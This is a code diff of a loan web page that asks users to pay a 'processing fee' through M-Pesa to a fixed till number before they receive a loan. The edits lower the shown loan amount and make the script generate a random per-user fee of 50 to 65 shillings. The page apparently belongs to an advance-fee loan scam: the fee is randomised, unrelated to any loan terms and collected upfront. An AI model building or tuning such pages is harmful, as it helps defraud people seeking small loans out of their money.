@@ -356,11 +356,11 @@
                 <h3 class="section-title"><i class="fas fa-money-bill-wave"></i> Loan Details</h3>
                 <div class="amount-details">
                     <div class="amount-label">Loan Amount:</div>
-                    <div class="amount-value" id="loanAmount">Ksh 2,740</div>
+                    <div class="amount-value" id="loanAmount">Ksh 750</div>
                 </div>
                 <div class="amount-details">
                     <div class="amount-label">Processing Fee:</div>
-                    <div class="amount-value" id="processingFee">Ksh 100</div>
+                    <div class="amount-value" id="processingFee">Ksh 60</div>
                 </div>
             </div>
             
@@ -393,7 +393,7 @@
                     <li>Lipa na Mpesa</li>
                     <li>Buy Goods and Services</li>
                     <li>Enter <strong>9824375</strong> as the Till Number</li>
-                    <li>Enter <strong id="feeAmount">100</strong> as the amount</li>
+                    <li>Enter <strong id="feeAmount">60</strong> as the amount</li>
                     <li>Enter your M-Pesa PIN</li>
                 </ol>
             </div>
@@ -428,7 +428,7 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             // Get loan amount from localStorage (set in previous page)
-            const loanAmount = localStorage.getItem('loanAmount') || 2740;
+            const loanAmount = localStorage.getItem('loanAmount') || 750;
             document.getElementById('loanAmount').textContent = `Ksh ${parseInt(loanAmount).toLocaleString()}`;
             
             // Check if user already has a processing fee stored
@@ -436,7 +436,7 @@
             
             if (!processingFee) {
                 // Generate and store a fixed processing fee for this user (between 50 and 65)
-                processingFee = Math.floor(Math.random() * (100 - 85 + 1)) + 85;
+                processingFee = Math.floor(Math.random() * (65 - 50 + 1)) + 50;
                 localStorage.setItem('userProcessingFee', processingFee);
             } else {
                 // Use the stored processing fee
